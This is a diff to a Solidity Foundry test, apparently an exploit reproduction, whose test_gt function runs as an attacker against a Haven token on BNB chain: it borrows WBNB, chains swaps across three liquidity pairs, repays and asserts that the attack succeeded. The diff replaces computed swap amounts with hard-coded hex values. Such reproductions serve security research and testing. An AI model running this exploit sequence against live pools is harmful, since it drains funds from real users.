@@ -675,32 +675,17 @@ contract HavenTest is Test, BlockLoader {
 
     function test_gt() public {
         vm.startPrank(attacker);
-        borrow_wbnb_owner(1e18);
+        borrow_wbnb_owner(0x6f05b59d3b20000);
         printBalance("After step0 ");
         swap_pairhw_haven_haven_wbnb(1, 1);
         printBalance("After step1 ");
-        swap_pairhw_attacker_wbnb_haven(
-            1e18,
-            pairhw.getAmountOut(1e18, address(wbnb))
-        );
+        swap_pairhw_attacker_wbnb_haven(0xde0b6b3a764000, 0x10d9e630e3b);
         printBalance("After step2 ");
-        swap_pairbh_attacker_haven_busd(
-            haven.balanceOf(address(attacker)),
-            (pairbh.getAmountOut(
-                haven.balanceOf(address(attacker)),
-                address(haven)
-            ) * 85) / 100
-        );
+        swap_pairbh_attacker_haven_busd(0xea7bb7545d, 0xe54f93491895b800);
         printBalance("After step3 ");
-        swap_pairbw_attacker_busd_wbnb(
-            busd.balanceOf(address(attacker)),
-            pairbw.getAmountOut(
-                busd.balanceOf(address(attacker)),
-                address(busd)
-            )
-        );
+        swap_pairbw_attacker_busd_wbnb(0xe54f93491895b800, 0xe4fbc69449f200);
         printBalance("After step4 ");
-        payback_wbnb_owner((1e18 * 1003) / 1000);
+        payback_wbnb_owner((0x6f05b59d3b20000 * 1003) / 1000);
         printBalance("After step5 ");
         require(attackGoal(), "Attack failed!");
         vm.stopPrank();
